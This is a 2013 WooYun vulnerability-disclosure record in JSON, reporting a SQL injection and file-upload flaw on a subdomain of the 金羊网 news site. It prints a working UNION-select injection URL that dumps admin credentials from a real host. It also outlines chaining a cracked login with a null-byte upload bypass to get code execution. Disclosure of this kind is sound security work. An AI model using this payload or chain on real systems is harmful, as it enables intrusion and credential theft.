{"id": 64936, "wybug_id": "wooyun-2013-021248", "wybug_title": "金羊网SQL注入和文件上传的组合利用", "wybug_corp": "金羊网[羊城晚报集团数字媒体]", "wybug_author": "x3xtxt", "wybug_date": "2013-04-05 14:55", "wybug_open_date": "2013-06-14 10:45", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "任意文件上传", "管理员密码泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-14：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 金羊网二级域名中存在SQL注入和文件上传漏洞，组合利用两种漏洞可取得对目标系统执行任意代码的权限。 详细说明：     某一天赶巧看到一条来自金羊网的新闻，看完新闻之后习惯性地顺便看了一下目标站点，于是就有了如下的问题：   首先，SQL注入：PoC：http://shimen.ycwb.com/newindex.php?url=ychjcontent&id=51%20and%201=2%20union%20select%201,2,concat%28unhex%28hex%28fd_user_acount%29%29,0x3a3a3a,unhex%28hex%28fd_user_pas%29%29%29,4,5,6,7,8,9,10,11,12,13%20from%20tb_user%20limit%201\n\n   使用在线md5解密工具解密密码，利用获得的账号登陆系统http://shimen.ycwb.com/pic/zt/hysy/\n\n   进入后台之后，后台管理=>作品管理=>新增，上传文件，如图：\n\n   最后，查看效果：\n\n   差不多到这里就行了。   漏洞证明：  参看详细说明部分。   修复方案：  关于SQL注入问题的防御就不用多讲，造成此处的文件上传漏洞的原因也很明显，由于没有对写入目录参数dirpart进行有效过滤操作，通过%00切割绕过后缀检查。   版权声明：转载请注明来源 x3xtxt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}